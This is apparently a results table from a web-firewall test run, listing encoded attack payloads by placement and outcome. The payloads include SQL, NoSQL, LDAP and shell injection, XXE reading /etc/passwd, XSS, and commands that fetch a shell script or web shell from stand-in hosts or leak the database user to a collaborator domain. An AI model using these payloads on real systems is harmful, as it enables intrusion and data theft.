Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r6in9t0hseg3.interact.sh",passed,200,UserAgent,Plain,community,community-user-agent,failed
"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/6.17.0.RELEASE iPhone12,8 iOS/14.5.1))",passed,200,UserAgent,Plain,community,community-user-agent,failed
mercuryboard_user_agent_sql_injection.nasl',passed,200,UserAgent,Plain,community,community-user-agent,failed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/etc/passwd"">]><foo>&data;</foo>",passed,200,XMLBody,Plain,community,community-xxe,failed
"<?xml version=""1.0"" encoding=""UTF-7""?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
",passed,200,XMLBody,Plain,community,community-xxe,failed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,passed,200,URLParam,Base64Flat,owasp,ldap-injection,failed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,passed,200,JSONRequest,Base64Flat,owasp,ldap-injection,failed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,passed,200,HTMLForm,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,URLParam,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,HTMLForm,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,JSONRequest,Base64Flat,owasp,ldap-injection,failed
userPassword:2.5.13.18:=123,passed,200,URLParam,URL,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,HTMLForm,Base64Flat,owasp,ldap-injection,failed
userPassword:2.5.13.18:=123,passed,200,HTMLForm,URL,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,HTMLMultipartForm,Base64Flat,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,JSONRequest,Base64Flat,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,URLParam,Base64Flat,owasp,ldap-injection,failed
userPassword:2.5.13.18:=123,passed,200,HTMLMultipartForm,URL,owasp,ldap-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,URLParam,Base64Flat,owasp,mail-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,HTMLForm,Base64Flat,owasp,mail-injection,failed
userPassword:2.5.13.18:=123,passed,200,JSONRequest,URL,owasp,ldap-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,URLParam,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,HTMLMultipartForm,Base64Flat,owasp,mail-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,URLPath,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,HTMLForm,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,URLPath,Base64Flat,owasp,mail-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,HTMLForm,Base64Flat,owasp,mail-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,URLPath,Base64Flat,owasp,mail-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,URLParam,Base64Flat,owasp,mail-injection,failed
db.injection.insert%28%7Bsuccess:1%7D%29%3B,passed,200,URLPath,URL,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,HTMLMultipartForm,Base64Flat,owasp,mail-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
%27%2C%20$or:%20%5B%20%7B%7D%2C%20%7B%20%27order%27:%27order,passed,200,URLPath,URL,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,URLPath,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,URLParam,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,HTMLMultipartForm,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,JSONRequest,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,HTMLForm,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,HTMLMultipartForm,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,URLParam,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,URLPath,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,HTMLForm,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,JSONRequest,Base64Flat,owasp,path-traversal,failed
ax--exec=%60id%60--remote=origin,passed,200,URLPath,URL,owasp,rce-urlpath,failed
cmd=127.0.0.1 && ls /etc,passed,200,Header,Plain,owasp,rce,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,HTMLForm,Base64Flat,owasp,shell-injection,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,HTMLMultipartForm,Base64Flat,owasp,shell-injection,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,JSONRequest,Base64Flat,owasp,shell-injection,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,URLParam,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,HTMLMultipartForm,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,JSONRequest,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,URLParam,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,HTMLForm,Base64Flat,owasp,shell-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,HTMLForm,Base64Flat,owasp,shell-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,HTMLMultipartForm,Base64Flat,owasp,shell-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,URLParam,Base64Flat,owasp,shell-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,JSONRequest,Base64Flat,owasp,shell-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,Header,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,Header,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,Header,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,Header,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,URLParam,Base64Flat,owasp,ss-include,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,URLPath,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,HTMLForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,HTMLMultipartForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,URLParam,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,URLPath,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,HTMLForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,URLParam,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,HTMLMultipartForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,HTMLForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,URLPath,Base64Flat,owasp,ss-include,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,URLPath,Base64Flat,owasp,sst-injection,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,sst-injection,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,URLParam,Base64Flat,owasp,sst-injection,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,HTMLForm,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,URLParam,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,URLPath,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,HTMLForm,Base64Flat,owasp,sst-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,URLPath,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,HTMLMultipartForm,Base64Flat,owasp,sst-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,HTMLForm,Base64Flat,owasp,sst-injection,failed
"<!DOCTYPE x SYSTEM ""//x/x"" > <x>a</x>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,URLParam,Base64Flat,owasp,sst-injection,failed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
"<!DOCTYPE x [ <!ENTITY % y SYSTEM ""//y/y"" > %y; ]><x>a</x>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,sst-injection,failed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://host/text.txt"" > ] > <foo>&xxe;</foo>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><x xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://xxe-xsi-schemalocation.yourdomain[.]com/""/>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><xs:schema xmlns:xs=""http://www.w3.org/2001/XMLSchema""><xs:include namespace=""http://xxe-xsinclude-namespace.yourdomain[.]com/""/></xs:schema>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
